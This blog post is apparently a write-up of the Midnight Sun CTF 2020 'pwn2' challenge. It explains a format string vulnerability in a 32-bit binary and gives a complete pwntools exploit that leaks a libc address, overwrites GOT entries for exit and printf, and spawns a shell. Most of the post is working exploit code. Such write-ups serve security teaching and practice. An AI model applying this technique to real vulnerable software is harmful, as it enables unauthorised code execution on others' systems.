---
layout: post
title: Midnight Sun CTF 2020 Quals - pwn2
---

> An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
pwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-,
for GNU/Linux 3.2.0, BuildID[sha1]=5f206b596336ac6063433395e3fa740a86b57d30, stripped

Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Challenge was about exploiting format string vulnerabilty. Data is read from stdin into buffer and then directly passed to `printf` function.

![code decompiled][decompiled]

With first payload we want to leak libc address and jump back to main to send another payload that will spawn `/bin/sh`.

{% highlight python %}
main = 0x080485EB

# 0804b020 R_386_JUMP_SLOT   exit@GLIBC_2.0
# 0804b00c R_386_JUMP_SLOT   printf@GLIBC_2.0

# overwrite exit with main address and leak libc address
payload = (
    p32(exe.got["exit"]) +
    b"%34279x" +
    b"%7$hn" +
    b"MARK%xMARK"
)
io.sendline(payload)

data = io.recvuntil("input: ")
leak = int(re.search(b"MARK([0-9a-f]+)MARK", data).group(1), 16)

libc.address = leak - 0x1d85c0
log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
log.info("System: 0x%x", libc.sym.system)
{% endhighlight %}

Once the libc address is known we want to overwrite `printf` with address of `system`.

{% highlight python %}
num1 = ((libc.sym.system >> 16) & 0xff) - 0x8
num2 = (libc.sym.system & 0xffff) - num1 + 12280

# overwrite printf with system
payload = (
    p32(exe.got["printf"]) +
     p32(exe.got["printf"] + 2) +
     b"%" + bytes(str(num1), "utf-8") + b"x" +
     b"%8$hhn" +
     b"%" + bytes(str(num2), "utf-8") + b"x" +
     b"%7$hn"
)
io.sendline(payload)

io.sendline("/bin/sh")
io.interactive()

{% endhighlight %}

Sending `"/bin/sh"` will execute `system("/bin/sh")`.

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF('./pwn2')
libc = ELF('./libc.so.6')

host = args.HOST or 'pwn2-01.play.midnightsunctf.se'
port = int(args.PORT or 10002)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x08048695
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc.so.6"})
io.recvuntil("input: ")

main = 0x080485EB

# 0804b020 R_386_JUMP_SLOT   exit@GLIBC_2.0
# 0804b00c R_386_JUMP_SLOT   printf@GLIBC_2.0

# overwrite exit with main address and leak libc address
payload = (
    p32(exe.got["exit"]) +
    b"%34279x" +
    b"%7$hn" +
    b"MARK%xMARK"
)
io.sendline(payload)

data = io.recvuntil("input: ")
leak = int(re.search(b"MARK([0-9a-f]+)MARK", data).group(1), 16)

libc.address = leak - 0x1d85c0
log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
log.info("System: 0x%x", libc.sym.system)

num1 = ((libc.sym.system >> 16) & 0xff) - 0x8
num2 = (libc.sym.system & 0xffff) - num1 + 12280

# overwrite printf with system
payload = (
    p32(exe.got["printf"]) +
     p32(exe.got["printf"] + 2) +
     b"%" + bytes(str(num1), "utf-8") + b"x" +
     b"%8$hhn" +
     b"%" + bytes(str(num2), "utf-8") + b"x" +
     b"%7$hn"
)
io.sendline(payload)

io.sendline("/bin/sh")

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/midnightsun/pwn2
[decompiled]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn2/decompiled.png
